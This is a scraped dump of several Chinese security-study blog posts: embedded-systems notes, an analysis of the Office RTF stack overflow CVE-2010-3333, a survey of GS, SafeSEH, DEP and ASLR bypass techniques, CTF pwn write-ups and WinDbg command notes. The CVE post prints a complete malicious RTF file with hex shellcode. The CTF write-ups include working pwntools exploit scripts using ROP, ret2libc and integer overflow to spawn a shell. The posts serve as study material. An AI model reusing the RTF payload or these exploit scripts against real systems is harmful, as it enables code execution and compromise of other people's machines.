嵌入式系统入门什么是嵌入式系统： 一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。 嵌入式微控制器： 嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。 通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。 嵌入式微处理器： 单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。 典型嵌入式系统组成： 嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。 嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。 典型嵌入式系统: 硬件： 嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号 外部设备：在不同系统中有不同选择。 软件： 嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。 应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。 0x02 嵌入式软硬件系统数字电路是计算机的基础。 进制转换 计算机组成原理 直接内存访问：DMA 软件：系统软件、应用软件 软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。 常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。 操作系统的基本结构都是内核、驱动程序、程序库。 0x03 ARM处理器 微处理器 通用微处理器：用于高性能计算 嵌入式微处理器：针对某种特定应用的高能力计算 微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。 ARM:高性能RISC机器。 芯片体积小，功耗低，成本低性能优异 支持Thumb(16位)和ARM(32位) 内部大量使用寄存器，执行指令速度快。 大部分指令是操作寄存器，很少访问外部内存 采用多级流水线结构处理速度快。 多种寻址方式，数据存取方式灵活 指令长度固定，便于编译器操作以及执行指令 ARM指令集 算术运算指令 ADD:加法运算 add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2 ADC:带进位加法 ADC dest,op1,op2 SUB:减法 sub dest,op1,op2 dest=op1-op2 SBC：带进位减法 逻辑运算指令 AND:逻辑与(1 1为1，0 0为1，1 0为0) and dest,op1,op2 dest=op1 and op2 EOR:异或（1 1为0，0 0为0，10为1） MOV:复制数据 mov dest,op1 dest=op1 mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8 分支指令 B:跳转 b 地址 //跳转到指定地址 数据传送指令 单一数据传送指令：向内存装载和存储一个字节或一个字长的数据 LDR Rd,地址 STR Rd,地址 LDR B Rd,地址 STR B Rd,地址 多数据传送指令：向内存装载和存储多个字节或字的数据 xxM Rn(!),&lt;寄存器列表&gt;{^} xx:LD–装载，ST–存储 LDMED LDMIB//++i LDMFD LDMIA//i++ LDMEA LDMDB//++*i LDMFA LDMDA//*i++ STMFA STMIB//存储前增加地址 STMEA STMIA//存储后增加地址 STMFD STMDB//存储前增加值 STMED STMDA//存储后增加值 ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。 MMU:内存管理单元。 LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）LSR:逻辑右移，二进制从左往右，空位补0ASR:算术右移，符号位不变，高位空出补0，低位补1ROR:循环右移，低位移到高位RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充 寻址方式 立即寻址:用#表示数值 subs r0,#1;r0=r0-1 mov r0,#0xff00;r0=0xff00 寄存器寻址方式：读取寄存器得到操作数 mov r1,r2;r1=r2 sub r0,r1,r2;r0=r1-r2 寄存器偏移寻址：寄存器的值移位得结果 mov r0,r1,LSL #3;r0=r1*8 ands r0,r2,LSL #3;r0= r2*8 and r1 寄存器间接寻址：寄存器为地址，从对应内存重取出数据 LDR r0,[r1];r1为地址，从内存中取出数据存入r0 SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换 基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据 LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址 STR r0,[r1,#-2];r1数值-2得到数据地址 多寄存器寻址：一次传输多个寄存器值 LDMIA r1!,{r2r7,r12};r1单元重数据读到r2r7和r12,r1指定地址自动加1 栈寻址：先进后出，通过栈指针寄存器寻址 STMFD SP!,{R0R7,LR};r0r7和LR的内容压入堆栈 LDMFD SP!,{r0r7,LR};从堆栈中取出数据到r0r7和LR 0x04 嵌入式Linux一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。 0x05 建立软件开发环境 运行在windows平台下得到Linux系统模拟环境：Cygwin. linux下：串口工具minicom windows下：串口工具xshell ARM集成开发环境ADS c语言编译器armcc c++语言编译器armcpp 0x06 第一个linux应用程序 vi创建源代码文件hello.c gcc -c hello.c 编译运行 0x07 Linux应用程序编程基础 堆栈 内存管理函数 malloc():分配内存，不能初始化内存空间 free()：释放malloc()分配的内存 实用的内存分配函数 calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间 realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。 文件指针和流：FILE*fp getc() /fgetc() /getchar() POSIX文件I/O编程 POSIX可移植操作系统接口 open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性 文件头： &lt;sys/types.h&gt; &lt;sys/stat.h&gt; &lt;fcntl.h&gt; 0x08 开发多进程/线程程序 PCB进程控制块 fork()调用创建进程 退出进程：exit()、_exit()、atexit()、on_exit(). 常用进程间通信方法： 管道：单方向传送数据，只能在有共同父进程的进程间使用 pipe()函数：创建管道 #include&lt;unistd.h&gt; int pipe(int filedes[1]); 共享内存：不同进程可访问 int shmget():创建 void *shmat：获得一个共享内存ID对应的内存其实地址 int shmdt：从程序中分立一块共享内存 FIFO 消息队列 信号量 共享存储 socker Linux的多进程和多线程 0x09 网络通信应用 TCP/IP协议簇 IP协议：在传输层，负责数据包的传输管理 实现两个功能：寻址和分段","categories":[],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"漏洞战争学习笔记2：CVE-2010-3333","slug":"漏洞战争学习笔记2：CVE-2010-3333","date":"2022-08-09T03:17:04.198Z","updated":"2022-08-09T04:19:33.523Z","comments":true,"path":"2022/08/09/漏洞战争学习笔记2：CVE-2010-3333/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/","excerpt":"","text":"0x01 分析环境os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。 操作系统：windows XP SP3虚拟机：VM调试器：WinDbg、OD、IDAoffice:office word 2003 11.8169.8172 0x02 漏洞描述oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。 office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。 0x03 分析过程用Metasploit生成测试样本msf.rtf。 运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！ [待续] 打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。 g kb 在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88 通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD p 为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用 0x04 漏洞利用覆盖返回地址找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃 布置shellcode分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，布置shellcode如下： z{\\rtf1{}{\\shp{*\\shpinst{\\sp{\\sn pfragments}{\\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}```","categories":[],"tags":[{"name":"漏洞战争","slug":"漏洞战争","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/"}]},{"title":"各类型软件漏洞合集","slug":"类型漏洞合集","date":"2022-08-09T03:17:04.198Z","updated":"2022-08-09T04:18:23.849Z","comments":true,"path":"2022/08/09/类型漏洞合集/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/","excerpt":"","text":"0x01 格式化串漏洞介绍格式化串漏洞产生于数据输出函数中对输出格式解析的缺陷。当输入输出函数的格式控制符能够被外界影响时，攻击者可以利用读写内存的方法修改函数返回地址，劫持进程，使shellcoed得到执行。 此类漏洞发生条件苛刻，实际案例很少。 能够引起此漏洞的函数1234567891011int printf(const char* format [,argument]...);int wprintf(const wchar_t* format [,argument]...);int fwprintf(FILE* stream,const wchar_t* format [,argument]...);int sprintf(char buffer,const char* format [,argument]...);int swprintf(wchar_t *buffer,const wchar_t *format [,argument]...);int vprintf(const char* format,va_list argptr );int vwprintf(const wchar_t* format,va_list argptr );int vfprintf(FILE *stream,const char* format,va_list argptr );int vfwprintf(FILE *stream,const wchar_t* format,va_list argptr );int vsprintf(char *buffer,const char* format,va_list argptr );int vswprintf(wchar_t *buffer,const wchar_t* format,va_list argptr ); 0x02 GS安全编译选项保护介绍在所有函数调用发生时，GS编译选项会向栈帧内压入一个额外的随机DWORD,这个随机数被称为canary，在EBP前，系统在.data内存区存放了canary副本，函数返回前系统会执行安全验证操作，比较栈帧中canary与内存区副本是否一致，不一致则证明发生溢出，系统将进行异常处理。 以下情况不会应用GS 函数不包含缓冲区 函数被定义为具有变量参数列表 函数使用无保护的关键字标记 函数在第一个语句中包含内嵌汇编代码 缓冲区不是8字节类型且大小不大于4个字节。 典型突破GS的方法利用未保护的内存为了将GS对性能的影响降到最小，并不会所有的函数都会被保护，我们可以利用一些未被保护的函数绕过GS保护。 例子：函数中不包含4字节以上的缓冲区，不受到GS保护，函数返回前未进行任何安全检测，可以覆盖返回地址。 mov esp,ebp pop ebp retn``` ### 覆盖虚函数 程序只有在函数返回时才会check，而在此之前没有任何检查措施，我们可以在程序检查cookie之前劫持程序流程，实现溢出。 &gt; 例子：利用C++的虚函数来绕过GS机制。 &gt;&gt; 当函数中存在溢出，可能会影响到虚表指针，继而可以控制虚表指针使其指向我们可以控制的内存空间。 &gt; 虚函数实现过程：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数地址，根据地址转入虚函数执行。 ### 攻击异常处理 GS对S.E.H没有提供保护。我们可以通过攻击异常处理绕过GS. 通过超长字符串覆盖掉异常处理函数指针，想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被覆盖，我们就可以通过劫持S.E.H来控制程序的后续流程。 ### 同时替换栈中和.data中的Cookie cookie的生成具有很强的随机性，因为才出来基本不可能。同时替换栈中和.data中的cookie保证溢出后的一致性。 &gt; 例子：将shellcode赋值为8个0x90,OD运行断在test函数的if语句处，从if_addr取出cookie，与ebp异或后放入ebp-4的位置去。（函数返回前的校验过程：程序从ebp-4的位置取出cookie,与ebp异或后与if_addr处cookie比较一致性），如此.data中cookie成功修改为0x90. &gt; 接下来控制栈中cookie，通过超长字符串覆盖变量，修改cookie。 &gt; 布置shellcode:首先放4个0x90用于修改if_addr，然后跟着弹出“failwest”的机器码，然后用0x90填充至cookie的位置，接下来跟着90909090与当前ebp异或的结果，最后再加上4个字节的填充和shellcode起始地址(用来覆盖函数返回地址) # 0x03 SafeSEH：对异常处理的保护机制 在程序调用异常处理函数前，对要调用的异常处理函数进行校验，当发现函数不可靠将终止异常处理函数的调用。 ## 校验流程 异常处理函数的调用是通过RtlDispatchException()函数处理实现，SafeSEH机制也是从此处开始。其校验流程如下： * 检查异常处理链是否位于当前程序的栈中 * 异常处理指针是否指向当前程序栈中 * 调用函数RtlIsVaildHandler()对异常处理函数进行校验 * 异常处理函数地址是否在加载模块的内存空间 * 判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识（标识被设置，函数返回校验失败） * 程序中是否包含安全S.E.H表，将异常处理函数地址与该表匹配，成功则继续 * 判断是否设置ILonly标识。（设置此标识，证明该程序只包含.NET编译人中间语言，校验失败） * 判断异常处理函数地址是否位于不可执行页上，位于，则检测DEP是否开启，未开启则校验成功 * 判断系统是否允许跳转到加载模块的内存空间外执行，允许则返回成功 &gt; RtlIsVaildHandler()允许异常处理函数执行的情况： &gt;&gt; 异常处理函数位于加载模块内存范围之外，DEP关闭 &gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，且模块不是纯IL（中间语言）. &gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，异常处理函数地址包含在安全SEH表中。 ## 绕过SafeSEH（不考虑DEP影响） * 攻击返回地址绕过。 * 一个程序启用了SafeSEH但是未启用GS(或被攻击函数不受到GS保护)，攻击函数返回地址 * 利用虚函数绕过 * 从堆中绕过 * 利用未启用SafeSEH模块绕过 * 利用加载模块之外的地址绕过SafeSEH * # 0x04 DEP ## 介绍 溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，DEP(数据执行保护)就是用来弥补计算机对数据和代码混淆这一天然缺陷。 DEP基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 DEP主要作用是阻止数据页执行代码，分为软件DEP和硬件DEP. 软件DEP即SafeSEH，与CPU硬件无关。 硬件DEP是由Windows利用软件模拟实现，对操作系统提供一定的保护。（硬件DEP才是真正的DEP,需要CPU支持，AMD称之为NX，Intel称之为XD） ## 攻击DEP方法 ### 攻击未启用DEP程序 ### 利用Ret2Libc挑战DEP ret2libc是return-to-libc的缩写，由于DEP不允许我们直接到非可执行也执行指令，我们需要在其他可执行的位置找到符合我们要求的指令，让这条指令替我们工作，为了控制此条指令，在指令执行后还需要一个返回指令，以便回收程序的控制权。 #### 三种相对有效的绕过DEP的exploit方法 * 通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行 * 通过跳转到VirtualProtect函数来将shellcode所在内存页设置为可执行状态，然后在转入shellcode执行 * 通过跳转到VIrtualAlloc函数开辟一段具有执行权限的内存空间建，然后将shellcode复制到这段内存中执行 ### 利用可执行内存挑战DEP 有时候在进程的内存空间中会存在一段可读可写可执行的内存，如果能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会。此处需要一些运气，然而我在做实验上一向运气很差……,如果被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过memcpy函数将shellcode复制到这段内存区域中执行。 ### 利用.NET挑战DEP .NET的文件具有和PE文件一样的结构，即也具有.text等段，这些段会被映射到内存中，也会具有一定的可执行属性。将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了。 ### 利用java applet挑战DEP java applet与.NET类似，都可以被IE浏览器加载到客户端，而且加载到IE进程的内存空间后这些控件所在内存空间都具有可执行属性。 # 0x05 ASLR ## 介绍 ASLR,通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。包含了映像随机化、堆栈随机化、PEB与TEB随机化。 （支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASE标识来说明，编译程序时启用/dynmicbase链接选项就可以支持ASLR了） ### 映像随机化 在PE文件映射到内存中，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启红藕这个地址会变化。 映像随机化只对加载基址的前2个字节做了随机处理。 ### 堆栈随机化 在程序运行时随机的选择堆栈基址，堆栈基址在打开程序的时候确定。 ### PEB和TEB随机化 TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置。 ## 攻击方式 ### 攻击未启用ASLR模块 ASLR仅仅是安全机制，不支持ASLR的软件很多，这意味着加载基址固定，在当前进程找到这样的模块就可以利用它里面的指令作为跳板直接无视ASLR. 如：Adobe Flash Player ActiveX ### 利用部分覆盖进行定位内存地址 之前说过，映像随机化只是对映像加载基址的前2个字节做随机化处理，我们可覆盖这个地址的最后几个固定字节，就可以在一定范围内控制程序。 采用这种类似相对寻址方法来动态确定跳板指令的地址以实现调班指令的通用性。 ### 利用Heap spray技术定位内存地址 Heap spray原理：通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。 ### 利用Java applet heap spray技术定位内存地址 ### 为.NET控件禁用ASLR","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"攻防世界 int_overflow","slug":"攻防世界pwn-int_overflow","date":"2022-08-09T03:17:04.192Z","updated":"2020-09-10T07:29:14.007Z","comments":true,"path":"2022/08/09/攻防世界pwn-int_overflow/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/","excerpt":"","text":"checksec 查看保护机制 可直接使用栈溢出；基地址不变化；栈中数据有执行权限； 分析思路32位文件，按流程查看程序，main()无突破点。 进入login(),限制username长度最大0x19;限制passwd长度最大0x199； 进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。 此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。 综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit） 溢出之后到达else语句，函数返回 strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。 在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B. 攻击思路可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。 在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言： 在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。随机选取数值262.（what_is_this()函数的地址为4字节） 262-0x14-4-4=234 或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。 exp: 1234567891011from pwn import*sh=remote('111.198.29.45',39118)sh.recvuntil('Your choice:')flag=0x0804868Bsh.sendline('1')sh.recvuntil('username:')sh.sendline('z')sh.recvuntil('passwd:')payload='a'*0x14+'aaaa'+p32(flag)+'a'*234sh.sendline(payload)sh.interactive() cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界 guess_num","slug":"攻防世界pwn-guess_num","date":"2022-08-09T03:17:04.190Z","updated":"2020-09-10T07:29:14.001Z","comments":true,"path":"2022/08/09/攻防世界pwn-guess_num/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/","excerpt":"","text":"查看关键main()函数，发现gets(&amp;v11)存在栈溢出 进入sub_C3E()函数，确定满足条件即可cat flag。 题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。 注：（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.（2）libc共享库：可以使用命令 ldd guess_num 查找（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。 exp: 解释：引入pwn、ctypes模块；remote连接其他主机服务；elf=ELF(bin路径)本地运行pwn文件；libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；recvuntil()接收字符串；sendline(payload)发送payload；srand(1)设定随机数种子为1；循环十次；interactive()直接进行交互； 另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag. cyberpeace{c89cf2a54c56f16458a1164851a361b4}","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界 cgpwn2","slug":"攻防世界pwn-cgpwn2","date":"2022-08-09T03:17:04.188Z","updated":"2020-09-10T07:29:13.987Z","comments":true,"path":"2022/08/09/攻防世界pwn-cgpwn2/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/","excerpt":"","text":"算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。 name是全局变量，在bss区段，适合写入。 pwn()函数中调用了__system，但并没有‘/bin/sh’ 攻击思路在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。 payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’) 1234567891011from pwn import * # p = process('./cgpwn2')p = remote(\"111.198.29.45\",32966)system_addr = 0x804855Abss_addr = 0x804A080p.recvuntil('name\\n')p.sendline(\"/bin/sh\\x00\")p.recvuntil('here:\\n')payload = 0x26*'a' +'bbbb'+ p32(system_addr) + p32(bss_addr)p.sendline(payload)p.interactive() cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"攻防世界pwn-100","slug":"攻防世界pwn-100","date":"2022-08-09T03:17:04.186Z","updated":"2022-08-09T03:51:37.530Z","comments":true,"path":"2022/08/09/攻防世界pwn-100/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/","excerpt":"","text":"分析查壳：checksec 64位，无stack,无PIE； 运行程序，输入字符，无反馈，无限制。 ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1. 攻击思路无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。 puts只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即 pop rdi; retpop rsi; pop r15; ret 注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数传参顺序默认从后先开始传入。x86 x64一样。 此处需要学习利用寄存器传递参数。 关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。 由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。 初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段： 程序还需调用一个gadget,后续另起一篇学习 exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 #coding=utf-8from pwn import * # context.log_level = 'debug'io = remote('124.126.19.106',46612) # io = process(\"./pwn-100\")elf = ELF(\"./pwn-100\")rop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15rop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)pop_rdi_ret = 0x400763 # start_addr = elf.symbols['_start']start_addr = 0x400550puts_plt = elf.plt['puts']read_got = elf.got['read']binsh_addr = 0x601000def leak(addr): payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr) payload = payload.ljust(200, \"a\") io.send(payload) io.recvuntil(\"bye~\\n\") up = \"\" content = \"\" count = 0 while True: c = io.recv(numb=1, timeout=0.5) count += 1 if up == '\\n' and c == \"\": content = content[:-1] + '\\x00' break else: content += c up = c content = content[:4] log.info(\"%#x =&gt; %s\" % (addr, (content or '').encode('hex'))) return contentd = DynELF(leak, elf = elf)sys_addr = d.lookup('system', 'libc')log.info(\"system_addr =&gt; %#x\", sys_addr)payload = \"a\" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)payload += p64(rop2)payload += \"\\x00\" * 56 payload += p64(start_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.recvuntil(\"bye~\\n\") # gdb.attach(io)io.send(\"/bin/sh\\x00\")payload = \"a\" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)payload = payload.ljust(200, \"a\")io.send(payload)io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/pwn/"}]},{"title":"WinDbg使用整理","slug":"WinDbg使用整理","date":"2022-08-09T03:17:04.136Z","updated":"2022-08-09T03:50:36.972Z","comments":true,"path":"2022/08/09/WinDbg使用整理/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/","excerpt":"","text":"0x00 基础命令 .sympath //显示设置的符号表路径 .reload //此命令主要用于加载符号表。 .reload /f //重新装载模块 .reload /i //强制加载mismatched symbol U //这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度 db //显示一字节的长度。 dw //显示两字节的长度。 dd //显示四字节的长度。 dq //显示八字节的长度。 dD //显示double实数(8字节的长度)。 df //显示float实数(4字节的长度)。 da //显示asscii值 du //显示unicode值 ds //显示ANI_STRING值 dS //显示UNICODE_STRING的值 eb address value //在address 这个地址写入一个字节value ew address value //在address 这个地址写入两字节value ed address value //在address 这个地址写入四字节字节value eq address value //在address 这个地址写入八字节字节value 0x01 对象相关命令 dt //dt命令主要用于查看结构体。 lm //列出模块。 lm vm 模块名 //查看模块详细信息。 !process 0 0 //列出系统进程信息 !process 0 0 进程名 //列出该进程的信息 !process 0 1 进程名 //列出该进程更加的信息 !process 0 7 进程名 //列出该进程的详细信息，包括线程的 .process EPROCESS //切入该进程中 !object 地址 //显示该地址的对象信息。 bp address //在地址address插入断点。 ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。 ba access size 地址 //access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。 bd/be/bc bd 断点号 //此命令是关闭断点号所对应的断点 。 be 断点号 //此命令是开启断点号所对应的断点 。 bc * //去除所有断点。 x //x命令用来模糊查询 x nt!kesdestable* //样查看SSDT表的地址 dds 地址 